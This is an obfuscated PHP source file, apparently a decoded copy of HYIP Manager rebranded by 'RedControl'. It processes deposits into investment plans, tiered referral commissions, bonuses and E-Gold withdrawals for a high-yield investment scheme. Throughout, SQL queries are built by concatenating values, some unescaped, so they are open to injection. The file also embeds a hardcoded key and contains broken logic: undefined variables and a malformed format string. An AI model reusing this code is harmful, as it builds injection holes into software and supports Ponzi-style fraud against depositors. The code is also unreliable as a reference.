<?
/*****************************************************/
/*                                                    */
/*  Este archivo fue creado por RedControl            */
/*                                                    */
/*                                                    */
/*    Version:      2010                              */
/*    Author:       www.redcontrol.com.ar             */
/*    Release on:   2010.01.18                        */
/*                                                    */
/******************************************************/


  function elnlctuka ($elnlcCsCw)
  {
    $elnlcDxKrG = array ();
    if (preg_match ('/\\[default\\](.*?)\\[\\/default\\]/', $elnlcCsCw, $elnlcDxKrG))
    {
      $elnlcCsCw = $elnlcDxKrG[1];
    }

    return $elnlcCsCw;
  }

  function elnlciqru ($elnlcCsCw, $elnlcOzwH, $d)
  {
    global $elnlcebOCn;
    $elnlcsLBI = ($elnlcCsCw + 48273) % $elnlcOzwH;
    $elnlckbouN = $elnlcebOCn['elnlcMkRzz'];
    $elnlczEcS = $elnlcsLBI;
    while ($elnlckbouN == 0)
    {
      if ($d[$elnlcsLBI] != -1)
      {
        ++$elnlcsLBI;
        if ($elnlcsLBI == $elnlcOzwH)
        {
          $elnlcsLBI = $elnlcebOCn['elnlcMkRzz'];
          continue;
        }

        continue;
      }

      $elnlckbouN = $elnlcebOCn['elnlciREG'];
    }

    return $elnlcsLBI;
  }

  function elnlcrtpf ($elnlcCsCw, $elnlcOzwH, $d)
  {
    global $elnlcebOCn;
    $elnlcsLBI = ($elnlcCsCw + 48273) % $elnlcOzwH;
    $elnlckbouN = $elnlcebOCn['elnlcMkRzz'];
    while (!$elnlckbouN)
    {
      if ($d[$elnlcsLBI] == -1)
      {
        ++$elnlcsLBI;
        if ($elnlcsLBI == $elnlcOzwH)
        {
          $elnlcsLBI = $elnlcebOCn['elnlcMkRzz'];
          continue;
        }

        continue;
      }

      $elnlckbouN = $elnlcebOCn['elnlciREG'];
    }

    return $elnlcsLBI;
  }

  function elnlcvgwpi ()
  {
    global $elnlcebOCn;
    if (!defined ('THE_GC_SCRIPT_V2005_04_01'))
    {
      print 'Please use only original script';
      exit ();
    }

    global $elnlctogMz;
    global $elnlcroEyb;
    $q = 'select * from hm2_users where id = 1';
    ($elnlcaJzM = mysql_query ($q) OR print mysql_error ());
    $elnlcxtGN = array ();
    while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
    {
      $elnlcxtGN = array ();
      $z = elnlcsvap ($elnlcMuwB[$elnlcebOCn['elnlcNnlA']], '&hd,mnf(fska$d3jlkfsda' . $elnlcroEyb[$elnlcebOCn['elnlcKgpfS']]);
      $elnlcxtGN = unserialize ($z);
    }

    return $elnlcxtGN;
  }

  function elnlcsfjf ()
  {
    global $elnlcebOCn;
    if (!defined ('THE_GC_SCRIPT_V2005_04_01'))
    {
      print 'Please use only original script';
      exit ();
    }

    global $elnlctogMz;
    global $elnlcBFoT;
    global $elnlcroEyb;
    $z = elnlcxfvdc (elnlccyvpc (serialize ($elnlcBFoT), '&hd,mnf(fska$d3jlkfsda' . $elnlcroEyb[$elnlcebOCn['elnlcKgpfS']]));
    $q = '' . 'update hm2_users set ac = \'' . $z . '\' where id = 1';
    (mysql_query ($q) OR print mysql_error ());
  }

  function elnlczfwh ($elnlcwahp, $elnlcqQfG, $elnlcdrkS, $elnlcTTklA, $elnlcgobCh, $elnlcygfPy, $elnlcvvfv)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    global $elnlcvufT;
    $elnlcvvfv = intval ($elnlcvvfv);
    $elnlcygfPy = intval ($elnlcygfPy);
    $elnlcqQfG = intval ($elnlcqQfG);
    $elnlcdrkS = sprintf ('%.02f', $elnlcdrkS);
    $elnlcpdov = elnlcxfvdc ($elnlcTTklA);
    $elnlccaOsk = $elnlcebOCn['elnlcMkRzz'];
    $q = '' . 'select count(id) as cnt from hm2_history where ec = ' . $elnlcwahp . ' && type = \'add_funds\' && description like \'%Batch id = ' . $elnlcpdov . '\'';
    $elnlcaJzM = mysql_query ($q);
    $elnlcMuwB = mysql_fetch_array ($elnlcaJzM);
    if (0 < $elnlcMuwB[$elnlcebOCn['elnlcDdGF']])
    {
      $elnlccaOsk = $elnlcebOCn['elnlciREG'];
    }

    if ($elnlccaOsk == 1)
    {
      return 0;
    }

    $elnlckIUxs = 'Add funds to account from ' . $elnlcvufT[$elnlcwahp][$elnlcebOCn['elnlcfCuqi']] . ('' . '. Batch id = ' . $elnlcTTklA);
    if (($elnlcwahp == 4 AND $elnlcroEyb[$elnlcebOCn['elnlcsICuH']] == 1))
    {
      $elnlckIUxs = 'Add funds to account from ' . $elnlcvufT[$elnlcwahp][$elnlcebOCn['elnlcfCuqi']] . ('' . ' ' . $elnlcdrkS . ' - StormPay Fee. Batch id = ' . $elnlcTTklA);
      $elnlcdrkS = $elnlcdrkS - $elnlcdrkS * 6.90000000000000035527137 / 100 - 0.689999999999999946709295;
    }
    else
    {
      if (($elnlcwahp == 4 AND $elnlcroEyb[$elnlcebOCn['elnlcrmPSC']] == 1))
      {
        $elnlckIUxs = 'Add funds to account from ' . $elnlcvufT[$elnlcwahp][$elnlcebOCn['elnlcfCuqi']] . ('' . ' ' . $elnlcdrkS . ' - StormPay Fee. Batch id = ' . $elnlcTTklA);
        $elnlcdrkS = $elnlcdrkS - $elnlcdrkS * 2.89999999999999991118216 / 100 - 0.390000000000000013322676;
      }
    }

    if (0 < $elnlcroEyb[$elnlcebOCn['elnlcMVNjx']])
    {
      $elnlcuSNi = sprintf ('%0.2', $elnlcdrkS * $elnlcroEyb[$elnlcebOCn['elnlcMVNjx']] / 100);
      if ($elnlcuSNi < $elnlcroEyb[$elnlcebOCn['elnlcChIkU']])
      {
        $elnlcuSNi = $elnlcroEyb[$elnlcebOCn['elnlcChIkU']];
      }

      $elnlcdrkS = $elnlcdrkS - $elnlcuSNi;
      $elnlckIUxs .= '' . '. Deposit fee - ' . $elnlcuSNi;
    }

    if ($elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcnuRp'])
    {
      $elnlcwahp = $elnlcebOCn['elnlccDwq'];
    }

    $q = '' . 'insert into hm2_history set 
        	user_id = ' . $elnlcqQfG . ',
        	amount = \'' . $elnlcdrkS . '\',
        	type = \'add_funds\',
        	description = \'' . $elnlckIUxs . '\',
        	actual_amount = ' . $elnlcdrkS . ',
        	ec = ' . $elnlcwahp . ',
        	date = now()    
        	';
    (mysql_query ($q) OR print mysql_error ());
    $q = '' . 'select * from hm2_types where id = ' . $elnlcygfPy;
    ($elnlcaJzM = mysql_query ($q) OR print mysql_error ());
    $elnlcBjoKp = '';
    $elnlcEaBH = mysql_fetch_array ($elnlcaJzM);
    $elnlcVxcCV = -1;
    if ($elnlcEaBH)
    {
      $elnlcVxcCV += $elnlcMuwB[$elnlcebOCn['elnlcSESNT']];
      $elnlcBjoKp = elnlcxfvdc ($elnlcEaBH[$elnlcebOCn['elnlcfCuqi']]);
      if ($elnlcEaBH[$elnlcebOCn['elnlcNPfGR']] == 0)
      {
        $elnlcvvfv = $elnlcebOCn['elnlcMkRzz'];
      }
      else
      {
        if ($elnlcEaBH[$elnlcebOCn['elnlcRtrt']] == 0)
        {
          $elnlcEaBH[$elnlcebOCn['elnlcRtrt']] = $elnlcdrkS + 1;
        }

        if (($elnlcEaBH[$elnlcebOCn['elnlclvlF']] <= $elnlcdrkS AND $elnlcdrkS <= $elnlcEaBH[$elnlcebOCn['elnlcRtrt']]))
        {
          if ($elnlcEaBH[$elnlcebOCn['elnlcmoxNv']] == 1)
          {
            $elnlcAmNI = preg_split ('/\\s*,\\s*/', $elnlcEaBH[$elnlcebOCn['elnlcnhPg']]);
            if (!in_array ($elnlcvvfv, $elnlcAmNI))
            {
              $elnlcvvfv = $elnlcAmNI[0];
            }
          }
          else
          {
            if ($elnlcvvfv < $elnlcEaBH[$elnlcebOCn['elnlcUSya']])
            {
              $elnlcvvfv = $elnlcEaBH[$elnlcebOCn['elnlcUSya']];
            }

            if ($elnlcEaBH[$elnlcebOCn['elnlcmVtNR']] < $elnlcvvfv)
            {
              $elnlcvvfv = $elnlcEaBH[$elnlcebOCn['elnlcmVtNR']];
            }
          }
        }
        else
        {
          $elnlcvvfv = $elnlcebOCn['elnlcMkRzz'];
        }
      }
    }

    if ($elnlcVxcCV < 0)
    {
      $elnlcVxcCV = $elnlcebOCn['elnlcMkRzz'];
    }

    $q = '' . 'select min(hm2_plans.min_deposit) as min, max(if(hm2_plans.max_deposit = 0, 999999999999, hm2_plans.max_deposit)) as max from hm2_types left outer join hm2_plans on hm2_types.id = hm2_plans.parent where hm2_types.id = ' . $elnlcygfPy;
    $elnlcdQvlB = mysql_query ($q);
    $elnlckicWw = mysql_fetch_array ($elnlcdQvlB);
    $elnlcPJqRh = $elnlckicWw[$elnlcebOCn['elnlcOAkQR']];
    $elnlcvSaq = $elnlckicWw[$elnlcebOCn['elnlcKTBAk']];
    if (($elnlcPJqRh <= $elnlcdrkS AND $elnlcdrkS <= $elnlcvSaq))
    {
      $q = '' . 'insert into hm2_deposits set
          	user_id = ' . $elnlcqQfG . ',
          	type_id = ' . $elnlcygfPy . ',
          	deposit_date = now(),
          	last_pay_date = now()+ interval ' . $elnlcVxcCV . ' day,
          	status = \'on\',
          	q_pays = 0,
          	amount = \'' . $elnlcdrkS . '\',
          	actual_amount = \'' . $elnlcdrkS . '\',
          	ec = ' . $elnlcwahp . ',
          	compound = ' . $elnlcvvfv . '
          	';
      (mysql_query ($q) OR print mysql_error ());
      $elnlcDRwe = mysql_insert_id ();
      $q = '' . 'insert into hm2_history set 
          	user_id = ' . $elnlcqQfG . ',
          	amount = \'-' . $elnlcdrkS . '\',
          	type = \'deposit\',
          	description = \'Deposit to ' . elnlcxfvdc ($elnlcBjoKp) . ('' . '\',
          	actual_amount = -' . $elnlcdrkS . ',
          	ec = ' . $elnlcwahp . ',
          	date = now(),
                deposit_id = ' . $elnlcDRwe . '
          	');
      (mysql_query ($q) OR print mysql_error ());
      if ($elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlchVoR'])
      {
        $q = '' . 'update hm2_users set reset = 0 where id = ' . $elnlckaefz[$elnlcebOCn['elnlcdfxo']];
        mysql_query ($q);
      }

      if ($elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcvGPb'])
      {
        $q = '' . 'select count(id) as col from hm2_deposits where user_id = ' . $elnlcqQfG;
        ($elnlcaJzM = mysql_query ($q) OR print mysql_error ());
        $elnlcdIwxq = $elnlcebOCn['elnlcMkRzz'];
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          $elnlcdIwxq = $elnlcMuwB[$elnlcebOCn['elnlclbIq']];
        }

        $q = 'select count(distinct user_id) as col from hm2_deposits';
        ($elnlcaJzM = mysql_query ($q) OR print mysql_error ());
        $elnlcseMh = $elnlcebOCn['elnlciehi'];
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          $elnlcseMh = $elnlcMuwB[$elnlcebOCn['elnlclbIq']];
        }

        if (($elnlcdIwxq == 1 AND $elnlcseMh <= 500))
        {
          $q = '' . 'insert into hm2_history set
  	user_id = ' . $elnlcqQfG . ',
  	amount = 2,
  	type = \'bonus\',
  	description = \'Bonus\',
  	actual_amount = 2,
  	ec = ' . $elnlcwahp . ',
  	date = now()';
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      if ($elnlcroEyb[$elnlcebOCn['elnlcVLCl']] == 1)
      {
        $elnlcHcBeR = $elnlcebOCn['elnlcMkRzz'];
        if (0 < $elnlcroEyb[$elnlcebOCn['elnlcBKboJ']])
        {
          $elnlcHcBeR = $elnlcdrkS * 1000 / $elnlcroEyb[$elnlcebOCn['elnlcBKboJ']];
        }

        if (0 < $elnlcHcBeR)
        {
          $q = '' . 'update hm2_users set imps = imps + ' . $elnlcHcBeR . ' where id = ' . $elnlcqQfG;
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $elnlcaGcAk = elnlcjvehs ($elnlcqQfG, $elnlcdrkS, $elnlcwahp);
    }
    else
    {
      $elnlcBjoKp = 'Deposit to Account';
    }

    $q = '' . 'select * from hm2_users where id = ' . $elnlcqQfG;
    $elnlcaJzM = mysql_query ($q);
    $elnlcOgiqh = mysql_fetch_array ($elnlcaJzM);
    $elnlcKCwJ = array ($elnlcOgiqh);
    $elnlcKCwJ[$elnlcebOCn['elnlcAsniz']] = $elnlcOgiqh[$elnlcebOCn['elnlcAsniz']];
    $elnlcKCwJ[$elnlcebOCn['elnlcfCuqi']] = $elnlcOgiqh[$elnlcebOCn['elnlcfCuqi']];
    $elnlcKCwJ[$elnlcebOCn['elnlcBfAt']] = number_format ($elnlcdrkS, 2);
    $elnlcKCwJ[$elnlcebOCn['elnlchDAbD']] = $elnlcgobCh;
    $elnlcKCwJ[$elnlcebOCn['elnlcjbPh']] = $elnlcvufT[$elnlcwahp][$elnlcebOCn['elnlcfCuqi']];
    $elnlcKCwJ[$elnlcebOCn['elnlcjpTJ']] = $elnlcTTklA;
    $elnlcKCwJ[$elnlcebOCn['elnlcKAJw']] = $elnlcvvfv;
    $elnlcKCwJ[$elnlcebOCn['elnlcsNqxE']] = elnlctuka ($elnlcBjoKp);
    $elnlcKCwJ[$elnlcebOCn['elnlclPWA']] = $elnlcaGcAk;
    $elnlcKCwJ[$elnlcebOCn['elnlcteePR']] = '[no upline]';
    if (0 < $elnlcOgiqh[$elnlcebOCn['elnlclOTV']])
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcOgiqh[$elnlcebOCn['elnlclOTV']];
      ($elnlcaJzM = mysql_query ($q) OR print mysql_error ());
      while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
      {
        $elnlcKCwJ[$elnlcebOCn['elnlcteePR']] = $elnlcMuwB[$elnlcebOCn['elnlcAsniz']];
      }
    }

    $q = 'select email from hm2_users where id = 1';
    $elnlcaJzM = mysql_query ($q);
    $elnlccjyK = '';
    while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
    {
      $elnlccjyK = $elnlcMuwB[$elnlcebOCn['elnlcvtJI']];
    }

    elnlcfdrqh ('deposit_admin_notification', $elnlccjyK, $elnlcroEyb[$elnlcebOCn['elnlcOEEx']], $elnlcKCwJ);
    elnlcfdrqh ('deposit_user_notification', $elnlcOgiqh[email], $elnlcroEyb[$elnlcebOCn['elnlcOEEx']], $elnlcKCwJ);
    return 1;
  }

  function elnlcjvehs ($elnlcqQfG, $elnlcdrkS, $elnlcwahp)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    global $elnlcvufT;
    $q = '' . 'select * from hm2_users where id = ' . $elnlcqQfG;
    $elnlcvSIt = mysql_query ($q);
    $elnlccinv = mysql_fetch_array ($elnlcvSIt);
    if ($elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcnuRp'])
    {
      $elnlcFVImh = $elnlcBoVbj[$elnlcebOCn['elnlclOTV']];
      $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcFVImh;
      $elnlcaJzM = mysql_query ($q);
      $elnlcMuwB = mysql_fetch_array ($elnlcaJzM);
      if ($elnlcMuwB[$elnlcebOCn['elnlcDdGF']] <= 0)
      {
        return 0;
      }

      $q = '' . 'select sum(actual_amount) as amnt from hm2_deposits as d, hm2_users as u where d.user_id = u.id and d.status = \'on\' and u.ref = ' . $elnlcFVImh;
      $elnlcaJzM = mysql_query ($q);
      $elnlcMuwB = mysql_fetch_array ($elnlcaJzM);
      if ($elnlcMuwB[$elnlcebOCn['elnlczjMDn']] < 3000)
      {
        $elnlcGRpDe = $elnlcebOCn['elnlcMkRzz'];
        return 0;
      }
      else
      {
        if ($elnlcMuwB[$elnlcebOCn['elnlczjMDn']] < 6000)
        {
          $elnlcGRpDe = 0.0200000000000000004163336;
        }
        else
        {
          if ($elnlcMuwB[$elnlcebOCn['elnlczjMDn']] < 12000)
          {
            $elnlcGRpDe = 0.0500000000000000027755576;
          }
          else
          {
            $elnlcGRpDe = 0.100000000000000005551115;
          }
        }
      }

      $elnlcjaNno = $elnlcdrkS * $elnlcGRpDe;
      $q = '' . 'insert into hm2_history set
      	user_id = ' . $elnlcFVImh . ',
      	amount = ' . $elnlcjaNno . ',
      	actual_amount = ' . $elnlcjaNno . ',
      	type = \'commissions\',
      	description = \'Referral commission from ' . elnlcxfvdc ($elnlccinv[$elnlcebOCn['elnlcAsniz']]) . ('' . '\',
      	ec = ' . $elnlcwahp . ',
      	date = now()');
      (mysql_query ($q) OR print mysql_error ());
      $q = '' . 'select * from hm2_users where id = ' . $elnlcFVImh;
      $elnlcvSIt = mysql_query ($q);
      $elnlcMyiSw = mysql_fetch_array ($elnlcvSIt);
      $elnlcMyiSw[$elnlcebOCn['elnlcBfAt']] = number_format ($elnlcjaNno, 2);
      $elnlcMyiSw[$elnlcebOCn['elnlcETzs']] = $elnlccinv[$elnlcebOCn['elnlcAsniz']];
      $elnlcMyiSw[$elnlcebOCn['elnlcIilA']] = $elnlccinv[$elnlcebOCn['elnlcfCuqi']];
      $elnlcMyiSw[$elnlcebOCn['elnlcjbPh']] = $elnlcvufT[$elnlcwahp][$elnlcebOCn['elnlcfCuqi']];
      elnlcfdrqh ('referral_commision_notification', $elnlcMyiSw[$elnlcebOCn['elnlcvtJI']], $elnlcroEyb[$elnlcebOCn['elnlcOEEx']], $elnlcMyiSw);
    }

    $elnlcaGcAk = $elnlcebOCn['elnlcMkRzz'];
    if ($elnlcroEyb[$elnlcebOCn['elnlcFqLiS']] == 1)
    {
      $elnlcFVImh = $elnlcebOCn['elnlcMkRzz'];
      if (0 < $elnlccinv[$elnlcebOCn['elnlclOTV']])
      {
        $elnlcFVImh = $elnlccinv[$elnlcebOCn['elnlclOTV']];
      }
      else
      {
        return 0;
      }

      if ($elnlcroEyb[$elnlcebOCn['elnlcSfByU']])
      {
        $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcFVImh;
        $elnlcaJzM = mysql_query ($q);
        $elnlcMuwB = mysql_fetch_array ($elnlcaJzM);
        if ($elnlcMuwB[$elnlcebOCn['elnlcDdGF']] <= 0)
        {
          return 0;
        }
      }

      if ((0 < $elnlcroEyb[$elnlcebOCn['elnlcGttgm']] AND $elnlcdrkS < $elnlcroEyb[$elnlcebOCn['elnlcGttgm']]))
      {
        return 0;
      }

      if ($elnlcroEyb[$elnlcebOCn['elnlcMIzT']] == 1)
      {
        if (0 < $elnlcroEyb[$elnlcebOCn['elnlcqzpyT']])
        {
          $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcqQfG;
          $elnlcaJzM = mysql_query ($q);
          $elnlcMuwB = mysql_fetch_array ($elnlcaJzM);
          if ($elnlcMuwB[$elnlcebOCn['elnlcDdGF']] == 1)
          {
            $elnlcjaNno = $elnlcroEyb[$elnlcebOCn['elnlcqzpyT']];
            $elnlcaGcAk += $elnlcjaNno;
            $q = '' . 'insert into hm2_history set
    		user_id = ' . $elnlcFVImh . ',
    		amount = ' . $elnlcjaNno . ',
    		actual_amount = ' . $elnlcjaNno . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . elnlcxfvdc ($elnlccinv[$elnlcebOCn['elnlcAsniz']]) . ('' . '\',
    		ec = ' . $elnlcwahp . ',
    		date = now()');
            (mysql_query ($q) OR print mysql_error ());
            $q = '' . 'select * from hm2_users where id = ' . $elnlcFVImh;
            $elnlcvSIt = mysql_query ($q);
            $elnlcMyiSw = mysql_fetch_array ($elnlcvSIt);
            $elnlcMyiSw[$elnlcebOCn['elnlcBfAt']] = number_format ($elnlcjaNno, 2);
            $elnlcMyiSw[$elnlcebOCn['elnlcETzs']] = $elnlccinv[$elnlcebOCn['elnlcAsniz']];
            $elnlcMyiSw[$elnlcebOCn['elnlcIilA']] = $elnlccinv[$elnlcebOCn['elnlcfCuqi']];
            $elnlcMyiSw[$elnlcebOCn['elnlcjbPh']] = $elnlcvufT[$elnlcwahp][$elnlcebOCn['elnlcfCuqi']];
            elnlcfdrqh ('referral_commision_notification', $elnlcMyiSw[$elnlcebOCn['elnlcvtJI']], $elnlcroEyb[$elnlcebOCn['elnlcOEEx']], $elnlcMyiSw);
          }
        }
      }
      else
      {
        if ($elnlcroEyb[$elnlcebOCn['elnlcohMF']] == 1)
        {
          $q = '' . 'select count(distinct user_id) as col from hm2_users, hm2_deposits where ref = ' . $elnlcFVImh . ' and hm2_deposits.user_id = hm2_users.id';
        }
        else
        {
          $q = '' . 'select count(id) as col from hm2_users where ref = ' . $elnlcFVImh;
        }

        $elnlcaJzM = mysql_query ($q);
        if ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          $elnlcnyNpa = $elnlcMuwB[$elnlcebOCn['elnlclbIq']];
          $q = '' . 'select * from hm2_users where id = ' . $elnlcFVImh;
          $elnlcvSIt = mysql_query ($q);
          $elnlcztov = mysql_fetch_array ($elnlcvSIt);
          $elnlcMMLy = @unserialize ($elnlcztov[$elnlcebOCn['elnlcMryC']]);
          if (isset ($elnlcMMLy[$elnlcebOCn['elnlcAQFt']]))
          {
            $j = $elnlcebOCn['elnlciREG'];
            while (isset ($elnlcMMLy['ref_percent' . $j]))
            {
              if (($elnlcMMLy['ref_percent' . $j][0] <= $elnlcnyNpa AND $elnlcnyNpa <= $elnlcMMLy['ref_percent' . $j][1]))
              {
                $elnlcjaNno = $elnlcdrkS * $elnlcMMLy['ref_percent' . $j][2] / 100;
                $elnlcaGcAk += $elnlcjaNno;
                break;
              }

              ++$j;
            }
          }
          else
          {
            if ($elnlcroEyb[$elnlcebOCn['elnlchTiBm']] == $elnlcebOCn['elnlcpGaa'])
            {
              $q = '' . 'select sum(amount) as amnt from hm2_deposits where user_id = ' . $elnlcFVImh;
              $elnlcaJzM = mysql_query ($q);
              $elnlcMuwB = mysql_fetch_array ($elnlcaJzM);
              $elnlcGRpDe = $elnlcebOCn['elnlcMkRzz'];
              if (10000 <= $elnlcMuwB[$elnlcebOCn['elnlczjMDn']])
              {
                $elnlcGRpDe = $elnlcebOCn['elnlcdMAa'];
              }
              else
              {
                if (5000 <= $elnlcMuwB[$elnlcebOCn['elnlczjMDn']])
                {
                  $elnlcGRpDe = $elnlcebOCn['elnlckDAb'];
                }
                else
                {
                  if (3000 <= $elnlcMuwB[$elnlcebOCn['elnlczjMDn']])
                  {
                    $elnlcGRpDe = $elnlcebOCn['elnlcBfUH'];
                  }
                  else
                  {
                    if (1000 <= $elnlcMuwB[$elnlcebOCn['elnlczjMDn']])
                    {
                      $elnlcGRpDe = $elnlcebOCn['elnlcSUgL'];
                    }
                  }
                }
              }

              if (0 < $elnlcGRpDe)
              {
                if (4 <= $elnlcnyNpa)
                {
                  $elnlcGRpDe += 3;
                }

                $elnlcjaNno = $elnlcdrkS * $elnlcGRpDe / 100;
                $elnlcaGcAk += $elnlcjaNno;
                $q = '' . 'insert into hm2_history set
    		user_id = ' . $elnlcFVImh . ',
    		amount = ' . $elnlcjaNno . ',
    		actual_amount = ' . $elnlcjaNno . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . elnlcxfvdc ($elnlccinv[$elnlcebOCn['elnlcAsniz']]) . ('' . '\',
    		ec = ' . $elnlcwahp . ',
     		date = now()');
                (mysql_query ($q) OR print mysql_error ());
              }
            }
            else
            {
              $q = '' . 'select percent from hm2_referal where from_value <= ' . $elnlcnyNpa . ' and (to_value >= ' . $elnlcnyNpa . ' or to_value = 0) order by from_value desc limit 1';
              ($elnlcaJzM = mysql_query ($q) OR print mysql_error ());
              if ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
              {
                $elnlcjaNno = $elnlcdrkS * $elnlcMuwB[$elnlcebOCn['elnlclWRL']] / 100;
                $elnlcaGcAk += $elnlcjaNno;
                $q = '' . 'insert into hm2_history set
    		user_id = ' . $elnlcFVImh . ',
    		amount = ' . $elnlcjaNno . ',
    		actual_amount = ' . $elnlcjaNno . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . elnlcxfvdc ($elnlccinv[$elnlcebOCn['elnlcAsniz']]) . ('' . '\',
    		ec = ' . $elnlcwahp . ',
     		date = now()');
                (mysql_query ($q) OR print mysql_error ());
              }
            }
          }

          $q = '' . 'select * from hm2_users where id = ' . $elnlcFVImh;
          $elnlcvSIt = mysql_query ($q);
          $elnlcMyiSw = mysql_fetch_array ($elnlcvSIt);
          $elnlcMyiSw[$elnlcebOCn['elnlcBfAt']] = number_format ($elnlcjaNno, 2);
          $elnlcMyiSw[$elnlcebOCn['elnlcETzs']] = $elnlccinv[$elnlcebOCn['elnlcAsniz']];
          $elnlcMyiSw[$elnlcebOCn['elnlcIilA']] = $elnlccinv[$elnlcebOCn['elnlcfCuqi']];
          $elnlcMyiSw[$elnlcebOCn['elnlcjbPh']] = $elnlcvufT[$elnlcwahp][$elnlcebOCn['elnlcfCuqi']];
          elnlcfdrqh ('referral_commision_notification', $elnlcMyiSw[$elnlcebOCn['elnlcvtJI']], $elnlcroEyb[$elnlcebOCn['elnlcOEEx']], $elnlcMyiSw);
        }
      }

      if ($elnlcroEyb[$elnlcebOCn['elnlcMIzT']] != 1)
      {
        for ($i = $elnlcebOCn['elnlcDWKw']; $i < 11; ++$i)
        {
          if (($elnlcFVImh == 0 OR $elnlcroEyb['ref' . $i . '_cms'] == 0))
          {
            break;
          }

          if ((0 < $elnlcroEyb['ref' . $i . '_cms_minamount'] AND $elnlcdrkS < $elnlcroEyb['ref' . $i . '_cms_minamount']))
          {
            continue;
          }

          $q = '' . 'select * from hm2_users where id = ' . $elnlcFVImh;
          $elnlcaJzM = mysql_query ($q);
          $elnlcFVImh = $elnlcebOCn['elnlcMkRzz'];
          while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
          {
            $elnlcFVImh = $elnlcMuwB[$elnlcebOCn['elnlclOTV']];
            if (0 < $elnlcFVImh)
            {
              $elnlcqezT = $elnlcebOCn['elnlciREG'];
              if ($elnlcroEyb[$elnlcebOCn['elnlcSfByU']] == 1)
              {
                $elnlcqezT = $elnlcebOCn['elnlcMkRzz'];
                $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcFVImh;
                $elnlcJQHQU = mysql_query ($q);
                $elnlcqxGl = mysql_fetch_array ($elnlcJQHQU);
                if (0 < $elnlcqxGl[$elnlcebOCn['elnlcDdGF']])
                {
                  $elnlcqezT = $elnlcebOCn['elnlciREG'];
                }
              }

              if ($elnlcqezT == 1)
              {
                $elnlcjaNno = $elnlcdrkS * $elnlcroEyb['ref' . $i . '_cms'] / 100;
                $elnlcaGcAk += $elnlcjaNno;
                $q = 'insert into hm2_history set
                  user_id = ' . $elnlcMuwB[$elnlcebOCn['elnlclOTV']] . ('' . ',
                  amount = ' . $elnlcjaNno . ',
                  actual_amount = ' . $elnlcjaNno . ',
                  type = \'commissions\',
                  description = \'Referral commission from ') . elnlcxfvdc ($elnlccinv[$elnlcebOCn['elnlcAsniz']]) . ('' . ' ' . $i . ' level referral\',
                  ec = ' . $elnlcwahp . ',
                  date = now()');
                (mysql_query ($q) OR print mysql_error ());
                continue;
              }

              continue;
            }
          }
        }
      }
    }

    return $elnlcaGcAk;
  }

  function elnlcnftjg ($elnlcgobCh, $elnlcwahp)
  {
    global $elnlcebOCn;
    global $elnlcvufT;
    $elnlcwahp = intval ($elnlcwahp);
    $elnlcgobCh = elnlcxfvdc ($elnlcgobCh);
    $q = '' . 'select count(*) as cnt from hm2_pay_settings where n=\'ext_accounts_blacklist\' and v=\'' . $elnlcwahp . '=' . $elnlcgobCh . '\'';
    $elnlcaJzM = mysql_query ($q);
    $elnlcMuwB = mysql_fetch_assoc ($elnlcaJzM);
    if (0 < $elnlcMuwB[$elnlcebOCn['elnlcDdGF']])
    {
      return array (0, 'Blacklisted ' . $elnlcvufT[$elnlcwahp] . ' account ' . $elnlcgobCh);
    }

    return array (1, '');
  }

  function elnlcrlgh ($elnlcmqvST, $elnlcdrkS, $elnlcgobCh, $elnlcqAwQ, $elnlcSquPB)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    if ($elnlcroEyb[$elnlcebOCn['elnlcDBNH']] == $elnlcebOCn['elnlciyAL'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcroEyb[$elnlcebOCn['elnlcyxlp']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcgobCh == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to E-Gold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid E-Gold account', '');
    }

    list ($elnlcbKfED, $elnlcvjWVG) = elnlcnftjg ($elnlcgobCh, 0);
    if ($elnlcbKfED == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcvjWVG . '\'';
      mysql_query ($q);
      return array (0, $elnlcvjWVG);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcmqvST == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'egold_account_password\'';
        $elnlcaJzM = mysql_query ($q);
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          $elnlcOHPa = elnlclehv ($elnlcMuwB[$elnlcebOCn['elnlcimMT']], $elnlcebOCn['elnlcWsIB']);
        }
      }
      else
      {
        $elnlcOHPa = $elnlcmqvST;
      }

      $elnlcujLDk = curl_init ();
      $elnlcqAwQ = rawurlencode ($elnlcqAwQ);
      curl_setopt ($elnlcujLDk, CURLOPT_URL, 'https://www.e-gold.com/acct/confirm.asp');
      curl_setopt ($elnlcujLDk, CURLOPT_POST, 1);
